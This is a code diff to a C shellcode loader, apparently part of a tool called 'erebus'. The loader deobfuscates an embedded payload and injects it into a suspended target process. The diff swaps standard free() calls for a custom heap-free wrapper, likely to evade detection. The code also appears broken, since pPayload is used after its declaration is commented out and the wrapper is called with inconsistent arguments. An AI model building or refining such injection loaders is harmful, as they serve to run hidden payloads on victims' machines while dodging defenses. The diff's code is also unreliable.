@@ -24,11 +24,11 @@ VOID entry(void)
 	// 0. PREPARE MEMORY
 	// ============================================================
 	// Copy to Heap for Safe Decryption (Avoids Read-Only Access Violations)
-	unsigned char* pPayload = (unsigned char*)malloc(shellcode_size);
-	if (!pPayload) return; // Allocation failed
+	// unsigned char* pPayload = (unsigned char*)malloc(shellcode_size);
+	// if (!pPayload) return; // Allocation failed
 
-	// Copy raw shellcode to heap
-	memcpy(pPayload, shellcode, shellcode_size);
+	// // Copy raw shellcode to heap
+	// memcpy(pPayload, shellcode, shellcode_size);
 
 	// ============================================================
 	// 1. DEOBFUSCATE
@@ -39,11 +39,11 @@ VOID entry(void)
 		SIZE_T sDecodedSize = 0;
 		if (erebus::config.decode_method((CHAR*)pPayload, shellcode_size, &pDecoded, &sDecodedSize)) 
 		{
-			free(pPayload);
+			erebus::RtlFreeHeapC(RtlProcessHeap(), 0, pPayload);
 			pPayload = pDecoded;
 			shellcode_size = sDecodedSize;
 		} else {
-			free(pPayload);
+			erebus::RtlFreeHeapC(RtlProcessHeap(), 0, pPayload);
 			return; // Decoding failed
 		}
 	}
@@ -63,7 +63,7 @@ VOID entry(void)
 	// Remote Injection
 	wchar_t cmdline[] = CONFIG_TARGET_PROCESS;
 	if (!erebus::CreateProcessSuspended(cmdline, &process_handle, &thread_handle)) {
-		free(pPayload);
+		erebus::RtlFreeHeapC(RtlProcessHeap(), 0, pPayload);
 		return;
 	}
 #elif CONFIG_INJECTION_MODE == 2
@@ -79,7 +79,7 @@ VOID entry(void)
 
 	// Cleanup
 	memset(pPayload, 0, shellcode_size);
-	free(pPayload);
+	erebus::RtlFreeHeapC(pPayload);
 
 	return;
 }
